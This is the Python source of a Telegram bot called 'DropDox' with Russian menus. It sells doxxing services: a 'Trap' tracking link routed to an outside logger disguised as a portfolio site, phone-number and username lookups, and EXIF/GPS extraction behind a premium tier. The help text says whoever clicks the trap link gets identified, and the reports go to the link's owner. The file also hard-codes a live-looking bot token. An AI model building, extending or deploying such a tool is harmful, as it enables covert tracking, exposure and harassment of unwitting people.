import logging
import os
import json
import requests
import phonenumbers
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, executor, types

# --- [ КОНФИГУРАЦИЯ ] ---
API_TOKEN = '8504796844:AAGVerEJuDpiCiR-HxyP7t2GAfY-dFgAq3k'
OWNER_ID = 8380479728 
LOGGER_URL = "https://portfolio-myweb.up.railway.app/track" 
DATA_FILE = "users_db.json"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# --- [ БАЗА ДАННЫХ ] ---
def load_db():
    if not os.path.exists(DATA_FILE):
        return {"premium": {}, "admins": [], "banned": []}
    try:
        with open(DATA_FILE, "r") as f: return json.load(f)
    except: return {"premium": {}, "admins": [], "banned": []}

def save_db(data):
    with open(DATA_FILE, "w") as f: json.dump(data, f, indent=4)

def get_role(user_id):
    if user_id == OWNER_ID: return "Owner"
    db = load_db()
    if user_id in db["banned"]: return "Banned"
    if user_id in db["admins"]: return "Admin"
    uid_str = str(user_id)
    if uid_str in db["premium"]:
        expiry = datetime.strptime(db["premium"][uid_str], "%Y-%m-%d")
        if datetime.now() <= expiry: return "Premium"
        else:
            del db["premium"][uid_str]
            save_db(db)
    return "User"

# --- [ ТЕКСТЫ ИНФОРМАЦИИ ] ---
USER_INFO = (
    "<b>ℹ️ Справка для пользователя:</b>\n\n"
    "🪤 <b>Trap</b> — Создает твою личную ссылку-ловушку. Кто перейдет — того пробьем.\n"
    "📱 <b>Dox Phone</b> — Поиск инфо по номеру (Оператор, Регион).\n"
    "👤 <b>Dox User</b> — OSINT поиск по никнейму (доступно Premium).\n"
    "🖼 <b>EXIF Data</b> — Анализ фото и GPS (доступно Premium).\n\n"
    "<i>Для получения Premium обратитесь к @админу.</i>"
)

ADMIN_INFO = (
    "<b>🛠 ПАНЕЛЬ УПРАВЛЕНИЯ (ADMIN):</b>\n\n"
    "🔹 <b>Выдать доступ:</b>\n<code>/give_access [ID] [Дни]</code>\n"
    "🔹 <b>Забанить:</b>\n<code>/ban [ID]</code>\n"
    "🔹 <b>Статистика:</b> Кнопка 📊 Stats\n"
    "🔹 <b>Копии логов:</b> Тебе приходят копии отчетов твоих юзеров.\n"
    "--------------------------------\n"
)

# --- [ ОБРАБОТЧИКИ ] ---

@dp.message_handler(commands=['start', 'help'])
async def cmd_start_help(m: types.Message):
    role = get_role(m.from_user.id)
    if role == "Banned": return

    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("🪤 Trap", "📱 Dox Phone")
    if role in ["Premium", "Admin", "Owner"]:
        kb.add("👤 Dox User", "🖼 EXIF Data")
    if role in ["Owner", "Admin"]:
        kb.add("📊 Stats", "🚨 Panic")

    # Формируем текст ответа в зависимости от роли
    response = ""
    if role in ["Owner", "Admin"]:
        response = ADMIN_INFO + USER_INFO
    else:
        response = f"🦾 <b>DropDox v0.5.5</b>\nТвой статус: <b>{role}</b>\n\n" + USER_INFO

    await m.answer(response, reply_markup=kb, parse_mode="HTML")

@dp.message_handler(lambda m: m.text == "🪤 Trap")
async def trap_handler(m: types.Message):
    uid = m.from_user.id
    role = get_role(uid)
    link = f"{LOGGER_URL}?owner={uid}&type={role.lower()}"
    await m.answer(f"🛡 <b>{role}Link:</b>\n<code>{link}</code>\n\nОтчет придет сюда.", parse_mode="HTML")

@dp.message_handler(commands=['give_access'])
async def access(m: types.Message):
    if get_role(m.from_user.id) not in ["Owner", "Admin"]: return
    try:
        args = m.get_args().split()
        target_id, days = args[0], int(args[1])
        db = load_db()
        expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        db["premium"][str(target_id)] = expiry
        save_db(db)
        await m.answer(f"✅ Доступ для {target_id} выдан до {expiry}")
    except:
        await m.answer("Формат: <code>/give_access 1234567 30</code>", parse_mode="HTML")

@dp.message_handler(lambda m: m.text == "📊 Stats")
async def stats(m: types.Message):
    if get_role(m.from_user.id) not in ["Owner", "Admin"]: return
    db = load_db()
    text = (f"📊 <b>Статистика:</b>\n"
            f"Premium: {len(db['premium'])}\n"
            f"Admins: {len(db['admins'])}\n"
            f"Banned: {len(db['banned'])}")
    await m.answer(text, parse_mode="HTML")

@dp.message_handler(lambda m: m.text == "🚨 Panic")
async def panic(m: types.Message):
    if get_role(m.from_user.id) != "Owner": return
    await m.answer("🚨 СИСТЕМА ВЫКЛЮЧЕНА")
    os._exit(0)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
    
